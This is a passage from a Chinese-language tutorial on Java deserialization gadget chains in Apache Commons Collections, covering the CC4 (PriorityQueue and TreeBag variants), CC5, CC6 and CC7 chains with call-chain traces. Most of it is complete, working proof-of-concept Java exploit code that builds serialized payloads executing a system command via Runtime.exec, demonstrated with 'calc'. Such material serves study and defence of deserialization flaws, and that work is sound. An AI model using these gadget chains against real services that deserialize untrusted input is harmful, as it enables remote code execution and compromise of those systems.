使用 PriorityQueue 反序列化时触发的 TransformingComparator 的 compare 方法，就会触发 ChainedTransformer 的 tranform 方法链，其中利用 InstantiateTransformer 实例化 TrAXFilter 类，此类实例化时会调用 TemplatesImpl 的 newTransformer 实例化恶意类，执行恶意代码

POC：
```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.*;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class cc4 {
    public static void main(String[] args) throws Exception {

        // 读取恶意类 bytes[]
        String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
        ClassPool classPool=ClassPool.getDefault();
        classPool.appendClassPath(AbstractTranslet);
        CtClass payload=classPool.makeClass("CommonsCollections444");
        payload.setSuperclass(classPool.get(AbstractTranslet));
        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");

        byte[] bytes=payload.toBytecode();

        // 初始化 TemplatesImpl 对象
        TemplatesImpl tmpl = new TemplatesImpl();
        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(tmpl, new byte[][]{bytes});
        // _name 不能为空
        Field name = TemplatesImpl.class.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(tmpl, "name");

        // 结合 ChainedTransformer
        ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{tmpl})
        });

        TransformingComparator comparator = new TransformingComparator(chain);

        // 在初始化时不带入 comparator
        PriorityQueue<String> queue = new PriorityQueue<>(2);
        queue.add("1");
        queue.add("2");

        Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(queue, comparator);

        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc4"));
            outputStream.writeObject(queue);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc4"));
            inputStream.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }
    }

}
```
调用链：
```
PriorityQueue.readObject()
  PriorityQueue.heapify()
  PriorityQueue.siftDown()
  PriorityQueue.siftDownUsingComparator()
  comparator.compare() === TransformingComparator.compare()
    ChainedTransformer.transform()
      ConstantTransformer.transform()
      InstantiateTransformer.transform()
      newInstance()
        TrAXFilter#TrAXFilter()
          TemplatesImpl.newTransformer()
            TemplatesImpl.getTransletInstance() 
              TemplatesImpl.defineTransletClasses()  // 定义类
            ...  // 创建类实例，触发static代码块
```
#### TreeBag
用 TreeBag 代替 PriorityQueue 触发 TransformingComparator，后续依旧使用 Transformer 的调用链
POC：
```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.*;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.*;
import java.lang.reflect.Field;

public class cc4_2 {
    public static void main(String[] args) throws Exception {
        // 读取恶意类 bytes[]
        String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
        ClassPool classPool=ClassPool.getDefault();
        classPool.appendClassPath(AbstractTranslet);
        CtClass payload=classPool.makeClass("CommonsCollections444");
        payload.setSuperclass(classPool.get(AbstractTranslet));
        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");

        byte[] bytes=payload.toBytecode();

        // 初始化 TemplatesImpl 对象
        TemplatesImpl tmpl = new TemplatesImpl();
        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(tmpl, new byte[][]{bytes});
        // _name 不能为空
        Field name = TemplatesImpl.class.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(tmpl, "name");

        // 用 InvokerTransformer 来反射调用 TemplatesImpl 的 newTransformer 方法
        // 这个类是 public 的，方便调用
        Transformer transformer = new InvokerTransformer("toString", new Class[]{}, new Object[]{});
        TransformingComparator comparator = new TransformingComparator(transformer);

        // prepare CommonsCollections object entry point
        TreeBag tree = new TreeBag(comparator);
        tree.add(tmpl);

        Field field = InvokerTransformer.class.getDeclaredField("iMethodName");
        field.setAccessible(true);
        field.set(transformer, "newTransformer");

        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc4"));
            outputStream.writeObject(tree);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc4"));
            inputStream.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}
```

调用链：
```
TreeBag.readObject()
  AbstractMapBag.doReadObject()
    TreeMap.put()
      TreeMap.compare() === TransformingComparator.compare()
        InvokerTransformer.transform()
          TemplatesImpl.newTransformer()
            TemplatesImpl.getTransletInstance() 
              TemplatesImpl.defineTransletClasses()  // 定义类
            ...  // 创建类实例，触发static代码块
        
```


## CommonsCollections5
CC5 依旧是 LazyMap 加 ChainedTransformer 的触发模式，只不过不再使用 AnnotationInvocationHandler 的动态代理来触发 LazyMap 的 get ，而是找到了其他的方式

因为 jdk 在 1.8 之后对 AnnotationInvocationHandler 类进行了修复，所以在 jdk 1.8 版本就必须找出能替代 AnnotationInvocationHandler 的新的可以利用的类

>测试环境：
JDK 1.7/JDK 1.8
Commons Collections 3.1

### 前置知识
#### TiedMapEntry
`org.apache.commons.collections.keyvalue.TiedMapEntry` 是一个 `Map.Entry` 的实现类，从名称中可以看到，这是一个绑定了底层 map 的 Entry，用来使一个 map entry 对象拥有在底层修改 map 的功能

TiedMapEntry 中有一个成员属性 Map，这就是 `Map.Entry` 的底层 map，TiedMapEntry 的 `getValue()` 方法会调用底层 map 的 get() 方法，我们可以用来触发 LazyMap 的 get
![](https://img-blog.csdnimg.cn/5e09c6363ea94930b3794767e1a07f9c.png)
可以发现 TiedMapEntry 的 equals/hashCode/toString 都可以触发getValue()
![](https://img-blog.csdnimg.cn/ca9fa0bb7b824d59a79af7b7b561d3bf.png)
接下来需要找到一个类在反序列化时会触发 TiedMapEntry 的 `toString()` 方法
#### BadAttributeValueExpException
于是找到了`javax.management.BadAttributeValueExpException`这个类，反序列化读取 val，当 `System.getSecurityManager() == null` 或 valObj 是除了 String 的其他基础类型时会调用 valObj 的 toString() 方法
![](https://img-blog.csdnimg.cn/4c7d692ae9b6400684b4ed7c41c18a20.png)
### 攻击构造
POC：
```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;

import javax.management.BadAttributeValueExpException;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;

public class cc5 {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class }, new Object[]{"calc"})
        });

        HashMap innermap = new HashMap();
        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);
        TiedMapEntry tiedmap = new TiedMapEntry(map,123);
        BadAttributeValueExpException poc = new BadAttributeValueExpException(1);
        Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
        val.setAccessible(true);
        val.set(poc,tiedmap);

        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc5"));
            outputStream.writeObject(poc);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc5"));
            inputStream.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}
```
1.为什么创建BadAttributeValueExpException实例时不直接将构造好的TiedMapEntry传进去而要通过反射来修改val的值？
![](https://img-blog.csdnimg.cn/f711a3425cc7459ea6fd6c0bcfcccb9e.png)
如果我们直接将前面构造好的TiedMapEntry传进去，在这里就会触发toString，从而导致rce。此时val的值为UNIXProcess，这是不可以被反序列化的，所以我们需要在不触发rce的前提，将val设置为构造好的TiedMapEntry

调用链：
```
BadAttributeValueExpException.readObject()
  valObj.toString() === TiedMapEntry.toString()
    TiedMapEntry.getValue()
      LazyMap.get()
         ChainedTransformer.transform()
          ConstantTransformer.transform() // 获取Runtime.class
          InvokerTransformer.transform()   // 获取Runtime.getRuntime
          InvokerTransformer.transform()   // 获取Runtime实例
          InvokerTransformer.transform()   // 调用exec方法触发rce
```

参考：[Java安全之Commons Collections5分析](https://www.cnblogs.com/nice0e3/p/13890340.html)

## CommonsCollections6
在 CC5 中我们使用了`TiedMapEntry#toString`来触发`LazyMap#get`，在 CC6 中是通过 `TiedMapEntry#hashCode` 来触发
>测试环境：
JDK 1.7/JDK 1.8
Commons Collections 3.1

### 前置知识
#### HashSet
在 HashSet 的 readObject 方法中，会调用其内部 HashMap 的 put 方法，将值放在 key 上
![](https://img-blog.csdnimg.cn/d1bf8c0ec2dc4c41939cf16302bd5bbc.png)

#### HashMap
`java.util.HashMap`可以说是最常用的 Map 的实现类
HashMap 为提升操作效率，根据键的 hashCode 值存储数据，并引入了链表来解决 hash 碰撞的问题，因此具有很快的访问速度。总体来说，HashMap 就是数组和链表的结合体

在使用 HashMap 的 put 方法时，会对 key 进行 hash，触发解析
![](https://img-blog.csdnimg.cn/91ef76201af144df8f005935a3c142fe.png)
![](https://img-blog.csdnimg.cn/a39b2eb7f07943a7bbfa88d4d020c959.png)

那么就可以触发`TiedMapEntry#hashCode`，接着触发`TiedMapEntry#getValue`，走到了cc5的后半段了
### 攻击构造
POC：
```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class cc6 {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {

        Transformer Testtransformer = new ChainedTransformer(new Transformer[]{});

        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[]{}}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

        Map map=new HashMap();
        Map lazyMap=LazyMap.decorate(map,Testtransformer);
        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,"test");

        HashSet hashSet=new HashSet(1);
        hashSet.add(tiedMapEntry);
        lazyMap.remove("test");

        //通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令
        Field field = ChainedTransformer.class.getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(Testtransformer, transformers);

        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc6"));
            outputStream.writeObject(hashSet);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc6"));
            inputStream.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}
```
![](https://img-blog.csdnimg.cn/cb17df796864496f877ed732b27b3d52.png)


需要`lazyMap.remove`方法移除前面填入的`KEY`才能够进行到该if判断语句里面去执行`transform`方法，否则就直接走的是else的方法体内容了

调用链：
```
HashSet.readObject()
  HashMap.put()
  HashMap.hash()
    TiedMapEntry.hashCode()
    TiedMapEntry.getValue()
      LazyMap.get()
         ChainedTransformer.transform()
          ConstantTransformer.transform() // 获取Runtime.class
          InvokerTransformer.transform()   // 获取Runtime.getRuntime
          InvokerTransformer.transform()   // 获取Runtime实例
          InvokerTransformer.transform()   // 调用exec方法触发rce
```

参考：[Java安全之Commons Collections6分析](https://www.cnblogs.com/nice0e3/p/13892510.html)

## CommonsCollections7
CC7 依旧是寻找 LazyMap 的触发点，这次用到了 Hashtable
>测试环境：
JDK 1.7/JDK 1.8
Commons Collections 3.1

### 前置知识
#### Hashtable
Hashtable 的 readObject 方法中，最后调用了`reconstitutionPut`方法将反序列化得到的 key-value 放在内部实现的 Entry 数组 table 里，`elements`为传入的元素个数
![](https://img-blog.csdnimg.cn/b9690c332deb417183c9c0504ef8ac39.png)
`reconstitutionPut`调用了 key 的 hashCode 方法
![](https://img-blog.csdnimg.cn/9727c1f058d94f7ba6de493069ba8a6e.png)
for循环中调用了`equals`，我们先看看进入for循环的条件：`e != null`，而`e = tab[index]`，此时`tab[index]`的值是为null的，所以不会进入for循环
如何才能进入for循环呢，既然调用一次`reconstitutionPut`不行，那我们就调用两次，也就是说put两个元素进`Hashtable`对象，这样`elements`的值就为2，readObject中的for循环就可以循环两次，第一次循环已经将第一组key和value传入到tab中了，当第二次到达`reconstitutionPut`中的for循环的时候，`tab[index]`中已经有了第一次调用时传入的值，所以不为null，可以进入for循环

接着看看if里面的判断，要求`e.hash == hash`，这里的e值为`tab[index]`，也就是第一组传入的值，这里的hash是通过`key.hashCode()`获取的，也就是说要put两个hash值相等的元素进去才行
在java中，`yy`和`zZ`的hash值恰好相等
![](https://img-blog.csdnimg.cn/2cee3acc9f4448bb9121365139701004.png)
#### AbstractMap
`AbstractMap#equals`调用了`m.get()`，而m是根据传入的对象获取的，也就是说如果传入的是LazyMap类对象，实际调用的是父类`AbstractMapDecorator`的equals函数
![](https://img-blog.csdnimg.cn/53d1d7a9d20d4e4887104e438a3581ac.png)
跟进到`AbstractMapDecorator#equals`，这里的map是可控的
![](https://img-blog.csdnimg.cn/7f4036f02af841f2bdb08f02f2dd2af4.png)

### 攻击构造
POC：
```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class cc7 {
    public static void main(String[] args) throws IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException {

        Transformer[] fakeTransformers = new Transformer[] {};

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class}, new String[] {"calc"}),
        };

        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
        lazyMap1.put("yy", 1);

        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
        lazyMap2.put("zZ", 1);

        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 2);

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        lazyMap2.remove("yy");
        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc7"));
            outputStream.writeObject(hashtable);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc7"));
            inputStream.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}
```
调用链：
```
Hashtable.readObject()
  Hashtable.reconstitutionPut()
    TiedMapEntry.hashCode()
    TiedMapEntry.getValue()
      AbstractMapDecorator.equals() === AbstractMap.equals()
        LazyMap.get()
           ChainedTransformer.transform()
            ConstantTransformer.transform() // 获取Runtime.class
            InvokerTransformer.transform()   // 获取Runtime.getRuntime
            InvokerTransformer.transform()   // 获取Runtime实例
            InvokerTransformer.transform()   // 调用exec方法触发rce
```
参考：[Java安全之Commons Collections7分析](https://www.cnblogs.com/nice0e3/p/13910833.html)


**版本相关**
>1、3、5、6、7是Commons Collections<=3.2.1中存在的反序列化链。
2、4是Commons Collections 4.0以上中存在的反序列化链。
同时还对JDK的版本有要求，这里使用的测试版本为1.7和1.8

全文参考：
[Java反序列化CommonsCollections篇(一) CC1链手写EXP](https://www.bilibili.com/video/BV1no4y1U7E1)
[理解Java反序列化漏洞(1)](http://www.wxylyw.com/2018/11/07/%E7%90%86%E8%A7%A3Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/)
[从零开始java代码审计系列(一)](https://xz.aliyun.com/t/4558)
[显易懂的JAVA反序列化入门](https://www.cnblogs.com/sijidou/p/13121305.html)
[浅析Java反序列化](https://xz.aliyun.com/t/10508)
[ysoserial分析【一】Apache Commons Collections ](https://www.cnblogs.com/litlife/p/12571787.html)
[Java安全之反序列化篇-URLDNS&Commons Collections 1-7反序列化链分析](https://paper.seebug.org/1242/)
[Java 反序列化取经路](https://su18.org/post/ysuserial/)
[Java 反序列化漏洞（二） - Commons Collections](https://su18.org/post/ysoserial-su18-2)
[反序列化CC篇总结](https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E6%80%BB%E7%BB%93/)
[通俗易懂的Java Commons Collections 5、6、7分析](https://xz.aliyun.com/t/10457)